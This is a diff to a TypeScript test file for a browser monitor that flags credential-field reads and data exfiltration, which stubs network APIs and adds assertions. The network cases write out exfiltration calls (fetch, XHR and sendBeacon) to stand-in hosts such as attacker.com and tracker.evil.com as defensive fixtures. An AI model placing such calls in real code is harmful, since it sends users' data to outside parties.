@@ -16,13 +16,25 @@ import {
 type PostSignalFn = (type: string, payload?: Record<string, unknown>) => void;
 
 // Stub network APIs before any test calls initJsBehaviorMonitor (which patches them).
-// The patches wrap whatever is at window.fetch/navigator.sendBeacon at init time.
+// The patches wrap whatever delegates are present at init time, so every delegate
+// must settle locally instead of letting Happy DOM start a real request.
+const testFetch = vi.fn().mockResolvedValue(new Response());
+const testXhrOpen = vi.fn();
+const testXhrSend = vi.fn();
+const testBeacon = vi.fn().mockReturnValue(true);
+
 beforeAll(() => {
-  window.fetch = vi.fn().mockResolvedValue(new Response()) as unknown as typeof window.fetch;
-  navigator.sendBeacon = vi.fn().mockReturnValue(true) as unknown as typeof navigator.sendBeacon;
+  window.fetch = testFetch as unknown as typeof window.fetch;
+  XMLHttpRequest.prototype.open = testXhrOpen as unknown as typeof XMLHttpRequest.prototype.open;
+  XMLHttpRequest.prototype.send = testXhrSend as unknown as typeof XMLHttpRequest.prototype.send;
+  navigator.sendBeacon = testBeacon as unknown as typeof navigator.sendBeacon;
 });
 
 beforeEach(() => {
+  testFetch.mockClear();
+  testXhrOpen.mockClear();
+  testXhrSend.mockClear();
+  testBeacon.mockClear();
   _resetState();
   document.body.innerHTML = "";
 });
@@ -521,16 +533,18 @@ describe("credential field value monitoring", () => {
     input.value = "secret";
 
     const baseTime = Date.now();
-    vi.spyOn(Date, "now").mockReturnValue(baseTime);
+    const nowSpy = vi.spyOn(Date, "now").mockReturnValue(baseTime);
     void input.value;
     expect(postSignal).toHaveBeenCalledTimes(1);
 
     // Advance past debounce window
-    vi.spyOn(Date, "now").mockReturnValue(baseTime + CREDENTIAL_READ_DEBOUNCE_MS + 1);
+    nowSpy.mockReturnValue(baseTime + CREDENTIAL_READ_DEBOUNCE_MS + 1);
     void input.value;
     expect(postSignal).toHaveBeenCalledTimes(2);
 
-    vi.restoreAllMocks();
+    // Keep the suite-wide settled fetch stub installed for the later fetch
+    // monitoring cases; only this test's clock spy needs restoration.
+    nowSpy.mockRestore();
   });
 
   it("does not emit during form submit flow", () => {
@@ -590,6 +604,7 @@ describe("network exfiltration monitoring fetch", () => {
     form.dispatchEvent(new Event("submit", { bubbles: true }));
 
     window.fetch("https://attacker.com/exfil", { method: "POST" });
+    expect(testFetch).toHaveBeenCalledWith("https://attacker.com/exfil", { method: "POST" });
 
     expect(postSignal).toHaveBeenCalledWith(
       "ns-js-exfil-network",
@@ -651,6 +666,8 @@ describe("network exfiltration monitoring XHR", () => {
     const xhr = new XMLHttpRequest();
     xhr.open("POST", "https://attacker.com/collect");
     xhr.send("data");
+    expect(testXhrOpen).toHaveBeenCalledWith("POST", "https://attacker.com/collect");
+    expect(testXhrSend).toHaveBeenCalledWith("data");
 
     expect(postSignal).toHaveBeenCalledWith(
       "ns-js-exfil-network",
@@ -674,6 +691,7 @@ describe("network exfiltration monitoring beacon", () => {
     document.body.appendChild(form);
 
     navigator.sendBeacon("https://tracker.evil.com/collect", "payload");
+    expect(testBeacon).toHaveBeenCalledWith("https://tracker.evil.com/collect", "payload");
 
     expect(postSignal).toHaveBeenCalledWith(
       "ns-js-exfil-beacon",
